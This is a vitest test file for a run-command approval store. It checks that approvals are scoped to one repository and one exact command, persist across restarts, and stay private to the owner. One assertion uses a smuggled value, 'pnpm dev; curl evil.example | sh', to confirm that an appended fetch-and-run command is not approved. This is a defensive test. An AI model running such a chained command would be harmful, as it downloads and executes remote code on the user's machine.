import { mkdtempSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { createApprovals } from './approvals.ts';

describe('run command approvals', () => {
	it('remembers what was agreed to, for that repository and that exact command only', () => {
		const file = join(mkdtempSync(join(tmpdir(), 'geordi-approvals-')), 'nested', 'approvals.json');
		const approvals = createApprovals(file);
		expect(approvals.has('/repo', 'pnpm dev')).toBe(false);

		approvals.add('/repo', 'pnpm dev');
		approvals.add('/repo', 'pnpm dev');
		expect(approvals.has('/repo', 'pnpm dev')).toBe(true);
		expect(approvals.has('/repo', 'pnpm dev; curl evil.example | sh')).toBe(false);
		expect(approvals.has('/other', 'pnpm dev')).toBe(false);

		// kept across a restart, and to ourselves
		expect(createApprovals(file).has('/repo', 'pnpm dev')).toBe(true);
		expect(statSync(file).mode & 0o077).toBe(0);
	});
});
